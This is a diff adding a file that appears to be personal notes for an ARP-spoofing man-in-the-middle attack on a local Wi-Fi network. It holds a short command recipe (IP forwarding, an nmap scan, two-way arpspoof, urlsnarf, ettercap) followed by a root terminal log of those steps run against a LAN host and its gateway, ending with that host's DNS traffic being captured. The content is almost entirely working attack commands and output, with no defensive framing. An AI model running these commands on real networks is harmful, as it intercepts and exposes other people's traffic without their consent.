@@ -1,0 +1,100 @@
+
+sudo su
+cat /proc/sys/net/ipv4/ip_forward
+echo 1 > /proc/sys/net/ipv4/ip_forward
+ifconfig
+nmap -sF 192.168.1.1-255
+arpspoof -i wlan0 -t <gateway> <host>
+arpspoof -i wlan0 -t <host> <gateway>
+
+urlsnarf -i wlan0
+ettercap -T -i wlan0
+
+
+kalavera@kalavera-AOD270:~$ sudo su
+[sudo] password for kalavera: 
+root@kalavera-AOD270:/home/kalavera# cat /proc/sys/net/ipv4/ip_forward 
+0
+root@kalavera-AOD270:/home/kalavera# echo 1 > /proc/sys/net/ipv4/ip_forward 
+root@kalavera-AOD270:/home/kalavera# cat /proc/sys/net/ipv4/ip_forward 
+1
+root@kalavera-AOD270:/home/kalavera# 
+
+
+
+root@kalavera-AOD270:/home/kalavera# ifconfig
+wlan0     Link encap:Ethernet  HWaddr --:--:--:--:--:--  
+          inet addr:192.168.1.67  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::864b:f5ff:fe3c:37e0/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:170763 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:181064 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:109200759 (109.2 MB)  TX bytes:103342011 (103.3 MB)
+
+
+
+root@kalavera-AOD270:/home/kalavera# nmap -sF 192.168.1.1-255
+Starting Nmap 5.21 ( http://nmap.org ) at 2013-02-17 14:45 CST
+
+Nmap scan report for 192.168.1.67
+Host is up (0.000080s latency).
+Not shown: 999 closed ports
+PORT   STATE         SERVICE
+80/tcp open|filtered http
+
+Nmap scan report for 192.168.1.105
+Host is up (0.0055s latency).
+Not shown: 999 closed ports
+PORT   STATE         SERVICE
+80/tcp open|filtered http
+MAC Address: --:--:--:--:--:-- (Unknown)
+
+Nmap scan report for 192.168.1.254
+Host is up (0.0052s latency).
+All 1000 scanned ports on 192.168.1.254 are open|filtered
+MAC Address: --:--:--:--:--:-- (Unknown)
+
+Nmap done: 255 IP addresses (5 hosts up) scanned in 55.74 seconds
+
+
+root@kalavera-AOD270:/home/kalavera# arpspoof -i wlan0 -t 192.168.1.254 192.168.1.105
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.105 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.105 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.105 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.105 is-at --:--:--:--:--:--
+
+root@kalavera-AOD270:/home/kalavera# arpspoof -i wlan0 -t 192.168.1.105 192.168.1.254
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.254 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.254 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.254 is-at --:--:--:--:--:--
+--:--:--:--:--:-- --:--:--:--:--:-- 0806 42: arp reply 192.168.1.254 is-at --:--:--:--:--:--
+
+
+
+root@kalavera-AOD270:/home/kalavera# ettercap -T -i wlan0
+
+ettercap NG-0.7.4.2 copyright 2001-2005 ALoR & NaGA
+
+Listening on wlan0... (Ethernet)
+
+ wlan0 ->	--:--:--:--:--:--      192.168.1.67     255.255.255.0
+
+Sun Feb 17 15:21:34 2013
+UDP  192.168.1.254:53 --> 192.168.1.105:44089 | 
+
+D............shop.ubuntu.com.................U...
+
+
+Sun Feb 17 15:21:34 2013
+UDP  192.168.1.105:33465 --> 192.168.1.254:53 | 
+
+[............www.ubuntu.com.....
+
+
+Sun Feb 17 15:21:34 2013
+UDP  192.168.1.254:53 --> 192.168.1.105:33465 | 
+
+[............www.ubuntu.com.................[.YX
+
+
